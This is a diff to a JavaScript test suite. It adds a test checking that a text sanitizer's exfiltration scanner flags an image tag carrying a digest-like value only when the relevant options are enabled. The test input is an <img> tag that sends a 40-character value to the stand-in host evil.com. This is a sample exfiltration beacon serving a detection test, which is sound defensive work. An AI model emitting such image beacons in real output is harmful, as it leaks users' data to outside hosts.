@@ -449,6 +449,27 @@ describe("sanitizeText: Layer 2/3 markdown pipeline gating", () => {
     assert.deepEqual(r.warnings, []);
   });
 
+  it("carries flagDigestValues into Layer 3, and only when asked", async () => {
+    // The option is only useful if it reaches the detector; a boolean accepted
+    // at the entry and dropped in the pipeline reads as working and is not.
+    const digest = `<img src="https://evil.com/x?h=${"a".repeat(40)}">`;
+    const defaulted = await sanitizeText(digest, { exfilScan: true });
+    assert.deepEqual(defaulted.warnings, []);
+    const widened = await sanitizeText(digest, {
+      exfilScan: true,
+      flagDigestValues: true,
+    });
+    assert.ok(widened.warnings.some((w) => /image to evil\.com/.test(w)));
+    assert.equal(widened.modified, false); // still detection only
+
+    // It WIDENS Layer 3; it does not switch Layer 3 on. `html` is the one
+    // option that implies the scan, so a caller that passes only this one gets
+    // the same silence any un-scanned text gets.
+    const unscanned = await sanitizeText(digest, { flagDigestValues: true });
+    assert.deepEqual(unscanned.warnings, []);
+    assert.deepEqual(unscanned.notes, []);
+  });
+
   it("exfilScan labels an exfil <img> threat as an image (not a link), and WARNS", async () => {
     const b64 = "A".repeat(44);
     const r = await sanitizeText(
